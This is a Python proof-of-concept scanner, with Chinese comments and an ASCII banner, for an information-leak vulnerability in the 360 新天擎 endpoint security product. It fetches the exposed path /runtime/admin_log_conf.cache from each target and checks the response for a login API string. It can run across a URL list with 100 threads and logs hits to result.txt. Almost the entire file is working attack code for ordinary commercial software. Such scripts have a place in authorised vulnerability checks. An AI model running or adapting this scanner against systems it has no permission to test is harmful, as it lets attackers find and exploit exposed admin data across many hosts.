
import argparse  # 用于解析命令行参数
import sys  # 提供对 Python 解释器的访问
import requests  # 发送 HTTP 请求
import time  # 处理时间相关的函数
from multiprocessing.dummy import Pool  # 使用多线程池进行并行处理
requests.packages.urllib3.disable_warnings()  # 禁止显示 urllib3 警告信息

# 打印程序横幅信息
def banner():
    banner = """
 ██▓    ▄▄▄       ███▄ ▄███▓    ▄▄▄          ██ ▄█▀ ██▓ ███▄    █   ▄████ 
▓██▒   ▒████▄    ▓██▒▀█▀ ██▒   ▒████▄        ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒██▒   ▒██  ▀█▄  ▓██    ▓██░   ▒██  ▀█▄     ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
░██░   ░██▄▄▄▄██ ▒██    ▒██    ░██▄▄▄▄██    ▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓
░██░    ▓█   ▓██▒▒██▒   ░██▒    ▓█   ▓██▒   ▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒
░▓      ▒▒   ▓▒█░░ ▒░   ░  ░    ▒▒   ▓▒█░   ▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
 ▒ ░     ▒   ▒▒ ░░  ░      ░     ▒   ▒▒ ░   ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░ 
 ▒ ░     ░   ▒   ░      ░        ░   ▒      ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
 ░           ░  ░       ░            ░  ░   ░  ░    ░           ░       ░                                                                                    
                                                                  version:1.0
                                                                  author:YeahSir                       
"""
    print(banner)

# 主函数
def main():
    banner()  # 显示程序横幅
    parser = argparse.ArgumentParser(description='this is a POC of 360新天擎 information leakage! ')
    parser.add_argument('-u', '--url', dest='url', type=str, help='please your urllink')  # 添加 -u 参数，用于指定单个URL
    parser.add_argument('-f', '--file', dest='file', type=str, help='please input your filename.txt(Absolute Path)')  # 添加 -f 参数，用于指定URL列表文件的路径
    args = parser.parse_args()  # 解析命令行参数

    # 如果提供了URL而没有提供文件，则直接执行POC
    if args.url and not args.file:
        poc(args.url)
    # 如果提供了文件而没有提供URL，则从文件中读取URL列表，并使用多线程池并行执行POC
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)  # 创建一个含有100个线程的线程池
        mp.map(poc, url_list)  # 并行执行POC
        mp.close()  # 关闭线程池
        mp.join()  # 等待所有线程结束
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")  # 打印用法说明

# POC 函数，用于检测特定漏洞
def poc(target):
    url = target + '/runtime/admin_log_conf.cache'  # 构造目标URL
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)"  # 设置请求头中的 User-Agent 字段
    }
    res = ""
    try:
        res = requests.get(url, headers=headers, verify=False, timeout=5).text  # 发送 HTTP GET 请求
        if '/api/node/login' in res:  # 判断响应中是否包含特定字符
            print(f"[+] 该{target}存在信息泄露的漏洞")  # 打印存在漏洞的信息
            with open("result.txt", "a", encoding="utf-8") as f:
                f.write(target + "\n")  # 将存在漏洞的URL写入文件
        else:
            print(f"[-] 该{target}不存在信息泄漏的漏洞")  # 打印未发现漏洞的信息
    except:
        print(f"[*] 该{target}访问失败，请手动测试")  # 捕获异常，打印访问错误信息

# 程序入口
if __name__ == '__main__':
    main()